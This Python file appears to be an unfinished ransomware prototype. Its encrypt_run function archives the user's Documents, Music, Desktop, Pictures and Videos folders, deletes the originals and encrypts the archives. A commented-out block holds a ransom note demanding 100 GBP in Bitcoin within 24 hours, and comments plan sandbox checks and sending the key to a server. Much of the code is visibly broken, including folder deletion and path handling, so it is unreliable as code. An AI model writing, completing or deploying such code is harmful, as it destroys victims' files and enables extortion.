from encryption import *
import shutil
import webbrowser
import os
payment = 0
startPath = "example"



def main():

    #test for sandbox, ping google and nonsense and check for a true/false

    key = 123465 #new.random()

    # send gerated key to server, along with generated ID, encrypt the
    # key using the same encryption that is built into the program to
    # lock user files before sending

    # encryption currently only works for text files error in the way the code reads in leads
    # leads to this just scrambling
    """
    """
    filepath = "d:/TestFolder/test.txt"
    encryptFile(10, filepath)
    decryptFile(10, filepath)

    """
    encrypt_run(key)
    # overwrite key to try and hide it.
    key = 00000

    print("
    \t Your files have been encrypted,
    \t pay 100 gbp to BitCoin wallet 123456789,
    \t input your email address and wallet number
    \t at our webpage fakepage.tor
    \t you will receive an email with the key to 
    \t unlock your files. If you don't pay within 
    \t 24 hours this key will be deleted and your 
    \t files will be lost forever
    \t 
    \t If the key is incorrect you will loose your files forever.
    ")
    #
    input = raw_input("Unlock key: ")
    decrypt_run(input)
    """


if __name__ == '__main__':
    main()

# defs below can be run without the encryption commented out

def encrypt_run(key):
    targetDocuments = os.path.expanduser(os.path.join('~', 'Documents'))
    targetMusic = os.path.expanduser(os.path.join('~', 'Music'))
    targetDesktop = os.path.expanduser(os.path.join('~', 'Desktop'))
    targetPictures = os.path.expanduser(os.path.join('~', 'Pictures'))
    targetVideos = os.path.expanduser(os.path.join('~', 'Videos'))

    shutil.make_archive(targetDocuments, 'zip', os.path.expanduser(targetDocuments))
    shutil.make_archive(targetMusic, 'zip', os.path.expanduser(targetMusic))
    shutil.make_archive(targetDesktop, 'zip', os.path.expanduser(targetDesktop))
    shutil.make_archive(targetPictures, 'zip', os.path.expanduser(targetPictures))
    shutil.make_archive(targetVideos, 'zip', os.path.expanduser(targetVideos))

    os.remove(targetDocuments)
    os.remove(targetMusic)
    os.remove(targetDesktop)
    os.remove(targetPictures)
    os.remove(targetVideos)

    encryptFile(key, targetDocuments.join('.zip'))
    encryptFile(key, targetMusic.join('.zip'))
    encryptFile(key, targetDesktop.join('.zip'))
    encryptFile(key, targetPictures.join('.zip'))
    encryptFile(key, targetVideos.join('.zip'))

    webbrowser.open_new('http://www.google.com')

    # clear key
    key = ''


def decrypt_run(deckey):
    targetDocuments = os.path.expanduser(os.path.join('~', 'Documents.zip'))
    targetMusic = os.path.expanduser(os.path.join('~', 'Music.zip'))
    targetDesktop = os.path.expanduser(os.path.join('~', 'Desktop.zip'))
    targetPictures = os.path.expanduser(os.path.join('~', 'Pictures.zip'))
    targetVideos = os.path.expanduser(os.path.join('~', 'Videos.zip'))

    decryptFile(deckey, targetDocuments)
    decryptFile(deckey, targetMusic)
    decryptFile(deckey, targetDesktop)
    decryptFile(deckey, targetPictures)
    decryptFile(deckey, targetVideos)

    # unreachable unpack??? needs to be resolved
    shutil.unpack_archive('Documents.zip', targetDocuments, 'zip')
    shutil.unpack_archive('Music.zip', targetMusic, 'zip')
    shutil.unpack_archive('Desktop.zip', targetMusic, 'zip')
    shutil.unpack_archive('Pictures.zip', targetPictures, 'zip')
    shutil.unpack_archive('Videos.zip', targetVideos, 'zip')
